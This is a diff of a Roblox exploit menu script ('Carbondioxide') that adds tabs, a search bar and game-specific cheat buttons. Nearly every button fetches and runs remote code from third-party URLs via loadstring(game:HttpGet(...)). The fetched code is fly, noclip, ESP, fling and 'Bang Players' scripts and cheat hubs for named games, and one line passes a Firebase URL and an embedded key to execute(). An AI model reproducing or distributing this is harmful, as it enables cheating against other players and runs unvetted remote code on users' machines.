@@ -3,9 +3,9 @@ local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- ══════════════════════════════════════════════════════
 --             MAIN GUI SETUP
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- ══════════════════════════════════════════════════════
 
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "Carbondioxide"
@@ -13,14 +13,14 @@ ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = game.CoreGui
 
--- â”€â”€ Toggle Button (Open/Close) â”€â”€
+-- ── Toggle Button ──
 local ToggleButton = Instance.new("TextButton")
 ToggleButton.Name = "ToggleButton"
 ToggleButton.Size = UDim2.new(0, 48, 0, 48)
 ToggleButton.Position = UDim2.new(0, 20, 0.5, -24)
 ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
 ToggleButton.BorderSizePixel = 0
-ToggleButton.Text = "ToggleButton"
+ToggleButton.Text = ""
 ToggleButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 ToggleButton.TextSize = 22
 ToggleButton.Font = Enum.Font.GothamBold
@@ -36,7 +36,7 @@ ToggleStroke.Color = Color3.fromRGB(0, 255, 100)
 ToggleStroke.Thickness = 2
 ToggleStroke.Parent = ToggleButton
 
--- â”€â”€ Main Frame â”€â”€
+-- ── Main Frame ──
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 320, 0, 420)
@@ -55,7 +55,7 @@ MainStroke.Color = Color3.fromRGB(0, 220, 90)
 MainStroke.Thickness = 2
 MainStroke.Parent = MainFrame
 
--- â”€â”€ Glow Effect (ImageLabel trick) â”€â”€
+-- ── Glow Effect ──
 local GlowFrame = Instance.new("Frame")
 GlowFrame.Size = UDim2.new(1, 20, 1, 20)
 GlowFrame.Position = UDim2.new(0, -10, 0, -10)
@@ -69,7 +69,10 @@ local GlowCorner = Instance.new("UICorner")
 GlowCorner.CornerRadius = UDim.new(0, 18)
 GlowCorner.Parent = GlowFrame
 
--- â”€â”€ Title Bar â”€â”€
+-- ══════════════════════════════════════════════════════
+--             TITLE BAR
+-- ══════════════════════════════════════════════════════
+
 local TitleBar = Instance.new("Frame")
 TitleBar.Name = "TitleBar"
 TitleBar.Size = UDim2.new(1, 0, 0, 42)
@@ -82,7 +85,6 @@ local TitleBarCorner = Instance.new("UICorner")
 TitleBarCorner.CornerRadius = UDim.new(0, 12)
 TitleBarCorner.Parent = TitleBar
 
--- Fix bottom corners of title bar
 local TitleBarFix = Instance.new("Frame")
 TitleBarFix.Size = UDim2.new(1, 0, 0.5, 0)
 TitleBarFix.Position = UDim2.new(0, 0, 0.5, 0)
@@ -91,7 +93,6 @@ TitleBarFix.BorderSizePixel = 0
 TitleBarFix.ZIndex = 2
 TitleBarFix.Parent = TitleBar
 
--- Title Label
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(1, -90, 1, 0)
 TitleLabel.Position = UDim2.new(0, 14, 0, 0)
@@ -104,7 +105,7 @@ TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 TitleLabel.ZIndex = 3
 TitleLabel.Parent = TitleBar
 
--- â”€â”€ Minimize Button â”€â”€
+-- ── Minimize Button ──
 local MinimizeBtn = Instance.new("TextButton")
 MinimizeBtn.Name = "MinimizeBtn"
 MinimizeBtn.Size = UDim2.new(0, 28, 0, 28)
@@ -122,7 +123,7 @@ local MinCorner = Instance.new("UICorner")
 MinCorner.CornerRadius = UDim.new(0, 6)
 MinCorner.Parent = MinimizeBtn
 
--- â”€â”€ Close Button â”€â”€
+-- ── Close Button ──
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Name = "CloseBtn"
 CloseBtn.Size = UDim2.new(0, 28, 0, 28)
@@ -140,11 +141,81 @@ local CloseCorner = Instance.new("UICorner")
 CloseCorner.CornerRadius = UDim.new(0, 6)
 CloseCorner.Parent = CloseBtn
 
--- â”€â”€ Content Frame (scrollable area below title) â”€â”€
+-- ══════════════════════════════════════════════════════
+--             TAB BAR
+-- ══════════════════════════════════════════════════════
+
+local TabBar = Instance.new("Frame")
+TabBar.Name = "TabBar"
+TabBar.Size = UDim2.new(1, 0, 0, 36)
+TabBar.Position = UDim2.new(0, 0, 0, 42)
+TabBar.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
+TabBar.BorderSizePixel = 0
+TabBar.ZIndex = 2
+TabBar.Parent = MainFrame
+
+local TabDivider = Instance.new("Frame")
+TabDivider.Size = UDim2.new(1, 0, 0, 1)
+TabDivider.Position = UDim2.new(0, 0, 1, -1)
+TabDivider.BackgroundColor3 = Color3.fromRGB(0, 180, 70)
+TabDivider.BorderSizePixel = 0
+TabDivider.ZIndex = 3
+TabDivider.Parent = TabBar
+
+-- Basic Tab Button (left side)
+local BasicTabBtn = Instance.new("TextButton")
+BasicTabBtn.Name = "BasicTab"
+BasicTabBtn.Size = UDim2.new(0, 140, 0, 26)
+BasicTabBtn.Position = UDim2.new(0, 8, 0.5, -13)
+BasicTabBtn.BackgroundColor3 = Color3.fromRGB(0, 50, 20)
+BasicTabBtn.BorderSizePixel = 0
+BasicTabBtn.Text = "Basic"
+BasicTabBtn.TextColor3 = Color3.fromRGB(0, 255, 128)
+BasicTabBtn.TextSize = 13
+BasicTabBtn.Font = Enum.Font.GothamBold
+BasicTabBtn.ZIndex = 3
+BasicTabBtn.Parent = TabBar
+
+local BasicTabCorner = Instance.new("UICorner")
+BasicTabCorner.CornerRadius = UDim.new(0, 6)
+BasicTabCorner.Parent = BasicTabBtn
+
+local BasicTabStroke = Instance.new("UIStroke")
+BasicTabStroke.Color = Color3.fromRGB(0, 230, 90)
+BasicTabStroke.Thickness = 1.5
+BasicTabStroke.Parent = BasicTabBtn
+
+-- Games Tab Button (right side)
+local GamesTabBtn = Instance.new("TextButton")
+GamesTabBtn.Name = "GamesTab"
+GamesTabBtn.Size = UDim2.new(0, 140, 0, 26)
+GamesTabBtn.Position = UDim2.new(1, -148, 0.5, -13)
+GamesTabBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+GamesTabBtn.BorderSizePixel = 0
+GamesTabBtn.Text = "Games"
+GamesTabBtn.TextColor3 = Color3.fromRGB(0, 180, 70)
+GamesTabBtn.TextSize = 13
+GamesTabBtn.Font = Enum.Font.GothamBold
+GamesTabBtn.ZIndex = 3
+GamesTabBtn.Parent = TabBar
+
+local GamesTabCorner = Instance.new("UICorner")
+GamesTabCorner.CornerRadius = UDim.new(0, 6)
+GamesTabCorner.Parent = GamesTabBtn
+
+local GamesTabStroke = Instance.new("UIStroke")
+GamesTabStroke.Color = Color3.fromRGB(0, 140, 55)
+GamesTabStroke.Thickness = 1
+GamesTabStroke.Parent = GamesTabBtn
+-- ══════════════════════════════════════════════════════
+--             CONTENT FRAMES
+-- ══════════════════════════════════════════════════════
+
+-- Basic Content Frame
 local ContentFrame = Instance.new("ScrollingFrame")
 ContentFrame.Name = "ContentFrame"
-ContentFrame.Size = UDim2.new(1, -12, 1, -52)
-ContentFrame.Position = UDim2.new(0, 6, 0, 48)
+ContentFrame.Size = UDim2.new(1, -12, 1, -88)
+ContentFrame.Position = UDim2.new(0, 6, 0, 84)
 ContentFrame.BackgroundTransparency = 1
 ContentFrame.BorderSizePixel = 0
 ContentFrame.ScrollBarThickness = 4
@@ -152,6 +223,7 @@ ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 200, 80)
 ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
 ContentFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
 ContentFrame.ZIndex = 2
+ContentFrame.Visible = true
 ContentFrame.Parent = MainFrame
 
 local ContentLayout = Instance.new("UIListLayout")
@@ -164,9 +236,73 @@ ContentPadding.PaddingTop = UDim.new(0, 6)
 ContentPadding.PaddingBottom = UDim.new(0, 10)
 ContentPadding.Parent = ContentFrame
 
--- SEARCH SYSTEM START ----------------------------------------
+-- Games Content Frame
+local GamesFrame = Instance.new("ScrollingFrame")
+GamesFrame.Name = "GamesFrame"
+GamesFrame.Size = UDim2.new(1, -12, 1, -88)
+GamesFrame.Position = UDim2.new(0, 6, 0, 84)
+GamesFrame.BackgroundTransparency = 1
+GamesFrame.BorderSizePixel = 0
+GamesFrame.ScrollBarThickness = 4
+GamesFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 200, 80)
+GamesFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+GamesFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+GamesFrame.ZIndex = 2
+GamesFrame.Visible = false
+GamesFrame.Parent = MainFrame
 
--- [ CONFIGURATION ] ------------------------------------------
+local GamesLayout = Instance.new("UIListLayout")
+GamesLayout.Padding = UDim.new(0, 8)
+GamesLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+GamesLayout.Parent = GamesFrame
+
+local GamesPadding = Instance.new("UIPadding")
+GamesPadding.PaddingTop = UDim.new(0, 6)
+GamesPadding.PaddingBottom = UDim.new(0, 10)
+GamesPadding.Parent = GamesFrame
+
+-- ══════════════════════════════════════════════════════
+--             TAB SWITCHING LOGIC
+-- ══════════════════════════════════════════════════════
+
+local currentTab = "Basic"
+
+local function SetTabActive(btn, stroke)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 50, 20)
+    btn.TextColor3 = Color3.fromRGB(0, 255, 128)
+    stroke.Color = Color3.fromRGB(0, 230, 90)
+    stroke.Thickness = 0.5
+end
+
+local function SetTabInactive(btn, stroke)
+    btn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    btn.TextColor3 = Color3.fromRGB(0, 180, 70)
+    stroke.Color = Color3.fromRGB(0, 140, 55)
+    stroke.Thickness = 0.5
+end
+
+BasicTabBtn.MouseButton1Click:Connect(function()
+    if currentTab == "Basic" then return end
+    currentTab = "Basic"
+    ContentFrame.Visible = true
+    GamesFrame.Visible = false
+    SetTabActive(BasicTabBtn, BasicTabStroke)
+    SetTabInactive(GamesTabBtn, GamesTabStroke)
+end)
+
+GamesTabBtn.MouseButton1Click:Connect(function()
+    if currentTab == "Games" then return end
+    currentTab = "Games"
+    ContentFrame.Visible = false
+    GamesFrame.Visible = true
+    SetTabActive(GamesTabBtn, GamesTabStroke)
+    SetTabInactive(BasicTabBtn, BasicTabStroke)
+end)
+
+-- ══════════════════════════════════════════════════════
+--             SEARCH SYSTEM (Basic tab only)
+-- ══════════════════════════════════════════════════════
+
 local SEARCH_CONFIG = {
     BarHeight = 36,
     BarPadding = 8,
@@ -177,22 +313,15 @@ local SEARCH_CONFIG = {
     HighlightTextColor = Color3.fromRGB(0, 150, 75),
 }
 
--- [ FUZZY SEARCH ENGINE ] ------------------------------------
 local SearchEngine = {}
 
 local function levenshtein(s, t)
     local m, n = #s, #t
     if m == 0 then return n end
     if n == 0 then return m end
-
     local matrix = {}
-    for i = 0, m do
-        matrix[i] = {[0] = i}
-    end
-    for j = 0, n do
-        matrix[0][j] = j
-    end
-
+    for i = 0, m do matrix[i] = {[0] = i} end
+    for j = 0, n do matrix[0][j] = j end
     for i = 1, m do
         for j = 1, n do
             local cost = (s:sub(i,i) == t:sub(j,j)) and 0 or 1
@@ -203,13 +332,11 @@ local function levenshtein(s, t)
             )
         end
     end
-
     return matrix[m][n]
 end
 
 local function similarity(a, b)
-    a = a:lower()
-    b = b:lower()
+    a = a:lower(); b = b:lower()
     if b:find(a, 1, true) then return 1.0 end
     local dist = levenshtein(a, b)
     local maxLen = math.max(#a, #b)
@@ -217,12 +344,9 @@ local function similarity(a, b)
 end
 
 local function windowSimilarity(query, target)
-    query  = query:lower()
-    target = target:lower()
+    query = query:lower(); target = target:lower()
     if #query == 0 then return 1.0 end
-    if #query > #target then
-        return similarity(query, target)
-    end
+    if #query > #target then return similarity(query, target) end
     local best = 0
     for i = 1, #target - #query + 1 do
         local window = target:sub(i, i + #query - 1)
@@ -246,25 +370,12 @@ function SearchEngine.match(query, label)
     return score
 end
 
--- [ UI BUILDER ] ---------------------------------------------
 local SearchUI = {}
 
 function SearchUI.createBar(parent)
-    for _, child in ipairs(parent:GetChildren()) do
-        if child:IsA("GuiObject") and child.Name ~= "SearchBar" then
-            child.Position = UDim2.new(
-                child.Position.X.Scale,
-                child.Position.X.Offset,
-                child.Position.Y.Scale,
-                child.Position.Y.Offset + SEARCH_CONFIG.BarHeight + SEARCH_CONFIG.BarPadding
-            )
-        end
-    end
-
     local container = Instance.new("Frame")
     container.Name = "SearchBar"
     container.Size = UDim2.new(1, -16, 0, SEARCH_CONFIG.BarHeight)
-    container.Position = UDim2.new(0, 8, 0, 6)
     container.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
     container.BorderSizePixel = 0
     container.ZIndex = 10
@@ -311,7 +422,7 @@ function SearchUI.createBar(parent)
     clearBtn.Size = UDim2.new(0, 24, 0, 24)
     clearBtn.Position = UDim2.new(1, -28, 0.5, -12)
     clearBtn.BackgroundTransparency = 1
-    clearBtn.Text = "X"
+    clearBtn.Text = "✕"
     clearBtn.TextColor3 = Color3.fromRGB(0, 255, 128)
     clearBtn.TextSize = 13
     clearBtn.Font = Enum.Font.GothamBold
@@ -320,9 +431,7 @@ function SearchUI.createBar(parent)
     clearBtn.Parent = container
 
     local function setFocusStyle(focused)
-        stroke.Color = focused
-            and Color3.fromRGB(0, 255, 128)
-            or  Color3.fromRGB(0, 180, 90)
+        stroke.Color = focused and Color3.fromRGB(0, 255, 128) or Color3.fromRGB(0, 180, 90)
         stroke.Thickness = focused and 1.5 or 1
     end
 
@@ -332,46 +441,35 @@ function SearchUI.createBar(parent)
     return container, input, clearBtn
 end
 
--- [ HIGHLIGHT ] ----------------------------------------------
 local function applyHighlight(button, query)
     local label = button:FindFirstChildWhichIsA("TextLabel") or button
-
     if not label then return end
-
     local original = label:GetAttribute("OriginalText") or label.Text
     label:SetAttribute("OriginalText", original)
-
     if not label:GetAttribute("OriginalColor") then
         label:SetAttribute("OriginalColor", label.TextColor3)
     end
-
     if query == "" then
         label.RichText = false
         label.Text = original
         label.TextColor3 = label:GetAttribute("OriginalColor")
         return
     end
-
     local lower = original:lower()
     local qLower = query:lower()
     local s, e = lower:find(qLower, 1, true)
-
     if s then
         label.RichText = true
         local pre  = original:sub(1, s-1)
         local mid  = original:sub(s, e)
         local post = original:sub(e+1)
-        label.Text = string.format(
-            '%s<font color="rgb(0,255,128)"><b>%s</b></font>%s',
-            pre, mid, post
-        )
+        label.Text = string.format('%s<font color="rgb(0,255,128)"><b>%s</b></font>%s', pre, mid, post)
     else
         label.RichText = false
         label.Text = original
     end
 end
 
--- [ SEARCH CONTROLLER ] --------------------------------------
 local SearchController = {}
 SearchController.__index = SearchController
 
@@ -408,21 +506,15 @@ end
 
 function SearchController:_filter(query)
     query = query:match("^%s*(.-)%s*$")
-
     for _, btn in ipairs(self.Buttons) do
         local label = btn:FindFirstChildWhichIsA("TextLabel")
         local text  = label and label.Text or btn.Text
         text = text:gsub("<[^>]+>", "")
-
         local score   = SearchEngine.match(query, text)
         local visible = (query == "") or (score >= SEARCH_CONFIG.FuzzyThreshold)
-
         btn.Visible = visible
-        if visible then
-            applyHighlight(btn, query)
-        end
+        if visible then applyHighlight(btn, query) end
     end
-
     self.ClearBtn.Visible = (query ~= "")
 end
 
@@ -430,7 +522,6 @@ function SearchController:_connect()
     self.InputBox:GetPropertyChangedSignal("Text"):Connect(function()
         if self.Debounce then return end
         self.Debounce = true
-
         task.delay(SEARCH_CONFIG.DebounceTime, function()
             self.Debounce = false
             local query = self.InputBox.Text
@@ -440,7 +531,6 @@ function SearchController:_connect()
             end
         end)
     end)
-
     self.ClearBtn.MouseButton1Click:Connect(function()
         self.InputBox.Text = ""
         self.InputBox:CaptureFocus()
@@ -448,17 +538,11 @@ function SearchController:_connect()
     end)
 end
 
--- SEARCH SYSTEM END ------------------------------------------
-
--- Place this line at the very bottom of your script,
--- after all your buttons have been created:
-local search = SearchController.new(ContentFrame)
--- SEARCH SYSTEM END ------------------------------------------
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- ══════════════════════════════════════════════════════
 --             HELPER FUNCTIONS
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- ══════════════════════════════════════════════════════
 
--- Creates a styled feature button
+-- Basic tab button creator
 local function CreateButton(labelText, callback)
     local Btn = Instance.new("TextButton")
     Btn.Size = UDim2.new(1, -16, 0, 42)
@@ -480,7 +564,6 @@ local function CreateButton(labelText, callback)
     BtnStroke.Thickness = 1.5
     BtnStroke.Parent = Btn
 
-    -- Hover animation
     Btn.MouseEnter:Connect(function()
         TweenService:Create(Btn, TweenInfo.new(0.15), {
             BackgroundColor3 = Color3.fromRGB(0, 50, 20),
@@ -493,9 +576,7 @@ local function CreateButton(labelText, callback)
             TextColor3 = Color3.fromRGB(0, 230, 90)
         }):Play()
     end)
-
     Btn.MouseButton1Click:Connect(function()
-        -- Click flash
         TweenService:Create(Btn, TweenInfo.new(0.07), {
             BackgroundColor3 = Color3.fromRGB(0, 200, 80)
         }):Play()
@@ -510,12 +591,12 @@ local function CreateButton(labelText, callback)
     return Btn
 end
 
--- Creates a section divider label
+-- Basic tab section label creator
 local function CreateSectionLabel(text)
     local Lbl = Instance.new("TextLabel")
     Lbl.Size = UDim2.new(1, -16, 0, 24)
     Lbl.BackgroundTransparency = 1
-    Lbl.Text = "" .. text .. ""
+    Lbl.Text = text
     Lbl.TextColor3 = Color3.fromRGB(0, 180, 70)
     Lbl.TextSize = 12
     Lbl.Font = Enum.Font.GothamBold
@@ -525,17 +606,81 @@ local function CreateSectionLabel(text)
     return Lbl
 end
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
---               FEATURE BUTTONS
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- Games tab button creator
+local function CreateGamesButton(labelText, callback)
+    local Btn = Instance.new("TextButton")
+    Btn.Size = UDim2.new(1, -16, 0, 42)
+    Btn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    Btn.BorderSizePixel = 0
+    Btn.Text = labelText
+    Btn.TextColor3 = Color3.fromRGB(0, 230, 90)
+    Btn.TextSize = 14
+    Btn.Font = Enum.Font.GothamBold
+    Btn.ZIndex = 3
+    Btn.Parent = GamesFrame
 
--- â”€â”€ Fly â”€â”€
+    local BtnCorner = Instance.new("UICorner")
+    BtnCorner.CornerRadius = UDim.new(0, 8)
+    BtnCorner.Parent = Btn
+
+    local BtnStroke = Instance.new("UIStroke")
+    BtnStroke.Color = Color3.fromRGB(0, 160, 60)
+    BtnStroke.Thickness = 1.5
+    BtnStroke.Parent = Btn
+
+    Btn.MouseEnter:Connect(function()
+        TweenService:Create(Btn, TweenInfo.new(0.15), {
+            BackgroundColor3 = Color3.fromRGB(0, 50, 20),
+            TextColor3 = Color3.fromRGB(120, 255, 160)
+        }):Play()
+    end)
+    Btn.MouseLeave:Connect(function()
+        TweenService:Create(Btn, TweenInfo.new(0.15), {
+            BackgroundColor3 = Color3.fromRGB(18, 18, 18),
+            TextColor3 = Color3.fromRGB(0, 230, 90)
+        }):Play()
+    end)
+    Btn.MouseButton1Click:Connect(function()
+        TweenService:Create(Btn, TweenInfo.new(0.07), {
+            BackgroundColor3 = Color3.fromRGB(0, 200, 80)
+        }):Play()
+        task.delay(0.1, function()
+            TweenService:Create(Btn, TweenInfo.new(0.15), {
+                BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+            }):Play()
+        end)
+        callback()
+    end)
+
+    return Btn
+end
+
+-- Games tab section label creator
+local function CreateGamesSectionLabel(text)
+    local Lbl = Instance.new("TextLabel")
+    Lbl.Size = UDim2.new(1, -16, 0, 24)
+    Lbl.BackgroundTransparency = 1
+    Lbl.Text = text
+    Lbl.TextColor3 = Color3.fromRGB(0, 180, 70)
+    Lbl.TextSize = 12
+    Lbl.Font = Enum.Font.GothamBold
+    Lbl.TextXAlignment = Enum.TextXAlignment.Center
+    Lbl.ZIndex = 3
+    Lbl.Parent = GamesFrame
+    return Lbl
+end
+
+-- ══════════════════════════════════════════════════════
+--             BASIC TAB BUTTONS
+-- ══════════════════════════════════════════════════════
+
+CreateSectionLabel("All of it is Keyless")
+
 CreateButton("Fly (Speed Control)", function()
     getgenv().script = "https://raw.githubusercontent.com/danya2854/Myscripts/refs/heads/main/Fly"
     loadstring(game:HttpGet("https://raw.githubusercontent.com/danya2854/Myscripts/refs/heads/main/loader"))()
 end)
 
--- â”€â”€ No Clip â”€â”€
 CreateButton("No Clip", function()
     local Workspace = game:GetService("Workspace")
     local CoreGui = game:GetService("CoreGui")
@@ -650,7 +795,10 @@ CreateButton("No Clip", function()
     end)
 end)
 
--- â”€â”€ ESP â”€â”€
+CreateSectionLabel("This Script Will Get Updated Every Week")
+
+CreateSectionLabel("Credit For The Person Who Made The Script Inside")
+
 CreateButton("ESP (Highlight Players)", function()
     _G.FriendColor = Color3.fromRGB(0, 0, 255)
     _G.EnemyColor = Color3.fromRGB(255, 0, 0)
@@ -787,12 +935,12 @@ CreateButton("ESP (Highlight Players)", function()
     end
 end)
 
--- â”€â”€ Teleport â”€â”€
+CreateSectionLabel("Thanks For Using This Script")
+
 CreateButton("Teleport System", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/parasopsays/Saved-Teleport/refs/heads/main/Ggs.txt"))()
 end)
 
--- â”€â”€ Fling â”€â”€
 CreateButton("Fling", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/K1LAS1K/Ultimate-Fling-GUI/main/flingscript.lua"))()
 end)
@@ -809,14 +957,50 @@ CreateButton("Bang Players", function()
     loadstring(game:HttpGet("https://xyzuscript.vercel.app/raw=true/7ee9ec9e-0684-488a-84bd-36ca024713ca"))()
 end)
 
-----Infinite Yield 
+CreateButton("Spectate Players", function()
+    loadstring(game:HttpGetAsync('https://pastefy.app/mJ8vapGJ/raw'))()execute("https://scriptprotector-d6fe7-default-rtdb.firebaseio.com/", "B4SraukVMMsjcGG2rAzqm2m0AkO5mY4bt3PkeNoo", "Script9")
+end)
+
+CreateButton("Wall Hop", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/refs/heads/main/Roblox%20WallHop%20V4%20script"))()
+end)
+
 CreateButton("Infinite Yield", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 end)
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
---         DRAGGING SUPPORT
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- Initialize search (Basic tab only, must be after all Basic buttons)
+local search = SearchController.new(ContentFrame)
+
+-- ══════════════════════════════════════════════════════
+--             GAMES TAB BUTTONS
+-- ══════════════════════════════════════════════════════
+
+CreateGamesSectionLabel("Thanks For Using This Script")
+
+CreateGamesButton("99 Nights", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VWExtra/main/NightsInTheForest.lua", true))()
+end)
+
+CreateGamesButton("Blox Fruits (Laggy When Starting)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/4479cantcode/4479Hub/refs/heads/main/Script.lua"))()
+end)
+
+CreateGamesButton("Grow A Garden", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end)
+
+CreateGamesButton("Steal A Brainrot", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/KaspikScriptsRb/steal-a-brainrot/refs/heads/main/.lua'))()
+end)
+
+CreateGamesButton("Sniper Arena (Works For Every FPS Games)", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/polo242c/sniper-arena/main/snpar"))()
+end)
+
+-- ══════════════════════════════════════════════════════
+--             DRAGGING SUPPORT
+-- ══════════════════════════════════════════════════════
 
 do
     local dragging, dragInput, dragStart, startPos
@@ -849,26 +1033,24 @@ do
     end)
 end
 
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
---         OPEN / CLOSE / MINIMIZE LOGIC
--- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- ══════════════════════════════════════════════════════
+--             OPEN / CLOSE / MINIMIZE LOGIC
+-- ══════════════════════════════════════════════════════
 
 local isOpen = true
 local isMinimized = false
 local fullSize = UDim2.new(0, 320, 0, 420)
 local minimizedSize = UDim2.new(0, 320, 0, 42)
 
--- Toggle open/close with the round side button
 ToggleButton.MouseButton1Click:Connect(function()
     isOpen = not isOpen
     if isOpen then
         MainFrame.Visible = true
-        ToggleButton.Text = "X"
+        ToggleButton.Text = ""
         TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
             Size = isMinimized and minimizedSize or fullSize
         }):Play()
     else
-        ToggleButton.Text = "X"
         TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
             Size = UDim2.new(0, 320, 0, 0)
         }):Play()
@@ -876,11 +1058,12 @@ ToggleButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Minimize button
 MinimizeBtn.MouseButton1Click:Connect(function()
     isMinimized = not isMinimized
     if isMinimized then
         ContentFrame.Visible = false
+        GamesFrame.Visible = false
+        TabBar.Visible = false
         TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
             Size = minimizedSize
         }):Play()
@@ -888,13 +1071,19 @@ MinimizeBtn.MouseButton1Click:Connect(function()
         TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
             Size = fullSize
         }):Play()
-        task.delay(0.15, function() ContentFrame.Visible = true end)
+        task.delay(0.15, function()
+            TabBar.Visible = true
+            if currentTab == "Basic" then
+                ContentFrame.Visible = true
+            else
+                GamesFrame.Visible = true
+            end
+        end)
     end
 end)
 
--- Close button: removes the GUI entirely
 CloseBtn.MouseButton1Click:Connect(function()
-    TweenService:Create(MainFrame, TweenInfo.new(0.2), { Size = UDim2.new(0, 320, 0, 0) }):Play()
+    TweenService:Create(MainFrame, TweenInfo.new(0.2), {Size = UDim2.new(0, 320, 0, 0)}):Play()
     task.delay(0.25, function()
         ScreenGui:Destroy()
     end)
